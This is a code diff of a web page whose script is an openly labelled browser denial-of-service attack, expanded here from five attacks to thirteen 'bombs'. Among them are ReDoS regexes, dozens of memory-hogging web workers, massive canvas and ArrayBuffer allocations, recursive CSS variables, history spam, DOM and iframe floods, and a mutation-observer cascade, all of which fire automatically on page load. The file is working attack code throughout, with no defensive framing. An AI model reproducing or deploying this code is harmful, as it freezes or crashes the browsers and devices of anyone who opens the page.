@@ -4,81 +4,190 @@
 <body><pre id="o"></pre></body>
 <script>
 const o=document.getElementById('o');
-const log=t=>{o.textContent+=t+'\n';o.scrollTop=o.scrollHeight};
+const log=t=>{o.textContent+=t+'\n'};
 const store=[];
 
+// Attack 1: ReDoS - SUPERCHARGED
 function redosBomb(){
   log('skill issue detected');
-  const evil = /^(a+)+$/;
-  const poison = 'a'.repeat(25) + 'b';
-  try { evil.test(poison); } catch(e){}
+  // Multiple evil patterns running simultaneously
+  const patterns = [
+    [/^(a+)+$/, 'a'.repeat(26)+'b'],
+    [/^(a|aa)+$/, 'a'.repeat(26)+'b'],
+    [/^(a+)+$/, 'a'.repeat(28)+'b'],
+  ];
+  patterns.forEach(([re,str])=>{try{re.test(str)}catch(e){}});
 }
 
-function domDepthBomb(){
-  let el = document.body;
-  for(let i=0;i<2000;i++){
-    const div = document.createElement('div');
-    div.style.cssText = 'padding:1px;border:1px solid rgba(255,0,0,0.1);transform:rotate(0.1deg);filter:blur(0.1px)';
-    el.appendChild(div);
-    el = div;
+// Attack 2: Recursive JSON - BIGGER
+function jsonBomb(){
+  log('JSON bomb...');
+  for(let k=0;k<5;k++){
+    let obj={};let cur=obj;
+    for(let i=0;i<100000;i++){cur.n={v:'x'.repeat(500)};cur=cur.n}
+    try{const s=JSON.stringify(obj);store.push(s);JSON.parse(s)}catch(e){}
   }
 }
 
+// Attack 3: DOM depth bomb - DEEPER
+function domDepthBomb(){
+  log('DOM depth bomb...');
+  for(let k=0;k<5;k++){
+    let el=document.body;
+    for(let i=0;i<3000;i++){
+      const div=document.createElement('div');
+      div.style.cssText='padding:1px;border:1px solid red;transform:rotate(0.1deg) scale(1.001);filter:blur(0.2px) brightness(1.01);box-shadow:0 0 5px red';
+      el.appendChild(div);el=div;
+    }
+    for(let i=0;i<2000;i++){
+      const span=document.createElement('span');
+      span.textContent='X'.repeat(200);
+      span.style.cssText='text-shadow:0 0 10px red,0 0 20px blue;filter:blur(1px)';
+      el.appendChild(span);
+    }
+  }
+}
+
+// Attack 4: Layout thrashing - MORE AGGRESSIVE
 function layoutBomb(){
-  const divs = document.querySelectorAll('div');
+  log('Layout thrash...');
   function thrash(){
-    divs.forEach(d=>{
-      const w = d.offsetWidth;
-      d.style.marginLeft = (Math.sin(Date.now()/100)*2)+'px';
-      const h = d.offsetHeight;
-      d.style.marginTop = (Math.cos(Date.now()/100)*2)+'px';
+    document.querySelectorAll('*').forEach(d=>{
+      void d.offsetWidth;void d.offsetHeight;void d.getBoundingClientRect();
+      d.style.marginLeft=(Math.sin(Date.now()/50)*3)+'px';
+      void d.offsetWidth;
+      d.style.marginTop=(Math.cos(Date.now()/50)*3)+'px';
+      void d.clientHeight;
+      d.style.padding=(Math.abs(Math.sin(Date.now()/100)))+'px';
     });
     requestAnimationFrame(thrash);
   }
-  thrash();
+  for(let i=0;i<10;i++)requestAnimationFrame(thrash);
 }
 
+// Attack 5: History bomb - FASTER
+function historyBomb(){
+  log('History bomb...');
+  let i=0;
+  function spam(){
+    for(let j=0;j<5000;j++)history.pushState({x:i++},'','#'+i);
+    setTimeout(spam,0);
+  }
+  for(let k=0;k<5;k++)spam();
+}
+
+// Attack 6: Worker bomb - MORE WORKERS, MORE MEMORY
 function workerBomb(){
-  const code=`const arr=[];setInterval(()=>{arr.push(new Uint8Array(50*1024*1024));for(let i=0;i<arr[arr.length-1].length;i+=4096)arr[arr.length-1][i]=255;},10);`;
-  for(let i=0;i<20;i++){
-    try{
-      const blob=new Blob([code],{type:'application/javascript'});
-      const w=new Worker(URL.createObjectURL(blob));
-      store.push(w);
-    }catch(e){}
+  log('Worker bomb...');
+  const code=`const a=[];setInterval(()=>{const b=new Uint8Array(100*1024*1024);for(let i=0;i<b.length;i+=4096)b[i]=255;a.push(b)},1);`;
+  for(let i=0;i<50;i++){
+    try{store.push(new Worker(URL.createObjectURL(new Blob([code],{type:'application/javascript'}))))}catch(e){}
   }
 }
 
+// Attack 7: Iframe bomb - MORE IFRAMES, HEAVIER CONTENT
 function iframeBomb(){
-  for(let i=0;i<50;i++){
+  log('Iframe bomb...');
+  for(let i=0;i<100;i++){
     const iframe=document.createElement('iframe');
-    iframe.style.cssText='width:100px;height:100px;position:absolute;left:'+Math.random()*500+'px;top:'+Math.random()*500+'px';
-    iframe.srcdoc=`<style>*{animation:x 0.1s infinite}@keyframes x{to{transform:rotate(360deg);filter:blur(5px)}}</style>`+'<div></div>'.repeat(500);
+    iframe.style.cssText='width:200px;height:200px;position:absolute;left:'+Math.random()*innerWidth+'px;top:'+Math.random()*innerHeight+'px';
+    iframe.srcdoc=`<style>*{animation:x 0.05s infinite;filter:blur(3px)}@keyframes x{to{transform:rotate(360deg) scale(1.5);filter:blur(10px)}}</style>`+'<div style="box-shadow:0 0 50px red">X</div>'.repeat(1000);
     document.body.appendChild(iframe);
   }
 }
 
-function mutationBomb(){
-  const target=document.body;
-  const observer=new MutationObserver((mutations)=>{
-    mutations.forEach(m=>{
-      const div=document.createElement('div');
-      div.style.cssText='width:10px;height:10px;background:red;position:absolute;left:'+Math.random()*innerWidth+'px;top:'+Math.random()*innerHeight+'px;filter:blur(2px);animation:x 1s infinite';
-      target.appendChild(div);
-    });
-  });
-  observer.observe(target,{childList:true,subtree:true});
-  for(let i=0;i<100;i++)document.body.appendChild(document.createElement('span'));
+// Attack 8: CSS variable recursion - MORE VARIABLES
+function cssVarBomb(){
+  log('CSS variable bomb...');
+  for(let k=0;k<10;k++){
+    const style=document.createElement('style');
+    let css=':root{';
+    for(let i=0;i<2000;i++)css+=`--v${k}_${i}:calc(var(--v${k}_${(i+1)%2000}) + 1px);`;
+    css+=`}div{width:var(--v${k}_0)}`;
+    style.textContent=css;
+    document.head.appendChild(style);
+  }
 }
 
+// Attack 9: Sync XHR - BIGGER PAYLOADS
+function syncXhrBomb(){
+  log('Sync XHR bomb...');
+  function spam(){
+    try{
+      const xhr=new XMLHttpRequest();
+      xhr.open('GET','data:text/plain,'+encodeURIComponent('x'.repeat(5000000)),false);
+      xhr.send();
+    }catch(e){}
+    setTimeout(spam,0);
+  }
+  for(let i=0;i<5;i++)spam();
+}
+
+// Attack 10: Mutation observer - EXPONENTIAL GROWTH
+function mutationBomb(){
+  log('Mutation bomb...');
+  const observer=new MutationObserver(muts=>{
+    muts.forEach(()=>{
+      for(let i=0;i<10;i++){
+        const div=document.createElement('div');
+        div.style.cssText='width:20px;height:20px;background:red;position:absolute;left:'+Math.random()*innerWidth+'px;top:'+Math.random()*innerHeight+'px;filter:blur(3px);animation:x 0.1s infinite;box-shadow:0 0 20px red';
+        document.body.appendChild(div);
+      }
+    });
+  });
+  observer.observe(document.body,{childList:true,subtree:true,attributes:true});
+  for(let i=0;i<500;i++)document.body.appendChild(document.createElement('span'));
+}
+
+// Attack 11: Canvas bomb
+function canvasBomb(){
+  log('Canvas bomb...');
+  for(let i=0;i<30;i++){
+    const c=document.createElement('canvas');
+    c.width=c.height=8192;
+    const ctx=c.getContext('2d');
+    ctx.fillStyle='#f00';ctx.fillRect(0,0,8192,8192);
+    const data=ctx.getImageData(0,0,8192,8192);
+    for(let j=0;j<data.data.length;j+=4096)data.data[j]=255;
+    store.push(data);store.push(c);
+  }
+}
+
+// Attack 12: String bomb
+function stringBomb(){
+  log('String bomb...');
+  let s='x';
+  for(let i=0;i<28;i++){s+=s;store.push(s)}
+}
+
+// Attack 13: ArrayBuffer bomb
+function arrayBomb(){
+  log('ArrayBuffer bomb...');
+  for(let i=0;i<50;i++){
+    const a=new Uint8Array(200*1024*1024);
+    for(let j=0;j<a.length;j+=4096)a[j]=255;
+    store.push(a);
+  }
+}
+
+// UNLEASH HELL
 log('=== SKILL ISSUE ===\n');
-setTimeout(()=>workerBomb(),0);
-setTimeout(()=>iframeBomb(),100);
-setTimeout(()=>domDepthBomb(),200);
-setTimeout(()=>layoutBomb(),300);
-setTimeout(()=>mutationBomb(),400);
+
+// All attacks fire rapidly
+workerBomb();
+setTimeout(iframeBomb,0);
+setTimeout(canvasBomb,50);
+setTimeout(arrayBomb,100);
+setTimeout(stringBomb,150);
+setTimeout(domDepthBomb,200);
+setTimeout(cssVarBomb,250);
+setTimeout(historyBomb,300);
+setTimeout(layoutBomb,350);
+setTimeout(mutationBomb,400);
+setTimeout(jsonBomb,450);
+setTimeout(syncXhrBomb,500);
 setTimeout(()=>{
-  log('\n...');
-  setTimeout(redosBomb,100);
-},500);
+  log('\n=== FINAL BLOW ===');
+  redosBomb();
+},600);
 </script>
